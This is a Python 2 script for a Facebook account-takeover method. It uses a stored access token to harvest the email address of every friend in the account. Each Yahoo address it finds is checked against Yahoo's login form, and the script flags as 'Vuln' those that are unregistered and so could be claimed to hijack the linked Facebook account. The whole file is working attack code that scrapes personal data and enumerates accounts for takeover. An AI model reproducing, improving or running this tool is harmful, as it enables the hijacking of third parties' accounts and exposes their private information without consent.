import os, sys, time
import requests, json, re, mechanize, urllib
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)

o = []
h = 0
token = []
w="\033[00m"
r="\033[31;1m"
g="\033[32;1m"
y="\033[33m"
d="\033[2;31m"
b="\033[34;1m"
p="\033[35;1m"
c="\033[36;1m"
W="\033[47m"
R="\033[41m"
B="\033[30m"
G="\033[90m"
BG="\033[100m"

def main():
    global token
    try:
        token = open('login.txt', 'r').read()
    except IOError as KeyError:
        print r+'[!ERROR]'+w+' Something wrong, please try again'
        os.system('rm -f login.txt')
    else:
        scan()

def scan():
    global h
    global o
    get_friends = requests.get('https://graph.facebook.com/me/friends?access_token=' + token)
    hasil = json.loads(get_friends.text)
    print
    print b+'[+]'+w+' Trying to dump ID friends'
    time.sleep(2)
    print b+'[+]'+w+' Checking e-mail using JSON'
    time.sleep(2)
    print b+'[+]'+w+' Checking yahoo vulnerability'
    print b+'[+]'+w+' Press ('+y+'ctrl+c'+w+') for stop the progress'
    time.sleep(1)
    print
    for i in hasil['data']:
        h += 1
        o.append(h)
        x = requests.get('https://graph.facebook.com/' + i['id'] + '?access_token=' + token)
        z = json.loads(x.text)
        try:
            kunci = re.compile('@.*')
            cari = kunci.search(z['email']).group()
            if 'yahoo.com' in cari:
                br.open('https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com')
                br._factory.is_html = True
                br.select_form(nr=0)
                br['username'] = z['email']
                j = br.submit().read()
                Zen = re.compile('"messages.ERROR_INVALID_USERNAME">.*')
                try:
                    cd = Zen.search(j).group()
                except:
                    vuln = r+'Not Vuln'
                    lean = 30 - len(z['email'])
                    res = (b+'[+]' +w+ ' Result:- ' + z['email'] + ' status:- ' + vuln).strip()
                    print res
                    continue
                if '"messages.ERROR_INVALID_USERNAME">' in cd:
                    vuln = g+'Vuln'
                else:
                    vuln = r+'Not Vuln'
                lean = 30 - len(z['email'])
                eml = lean * ' '
                lone = 24 - len(vuln)
                namel = lone * ' '
                ress = (b+'[+]' +w+ ' Result:- ' + z['email'] + ' status:- ' + vuln).strip()
                print ress
        except KeyError:
            pass
            
def menu():
        try:
            main()
        except KeyboardInterrupt:
            print
            dog = raw_input(w+'[ enter ]')
            sys.exit(1)
        except IOError as KeyError:
            print r+'[!ERROR]'+w+' Something wrong, please try again'
            os.system('rm -f login.txt')

menu()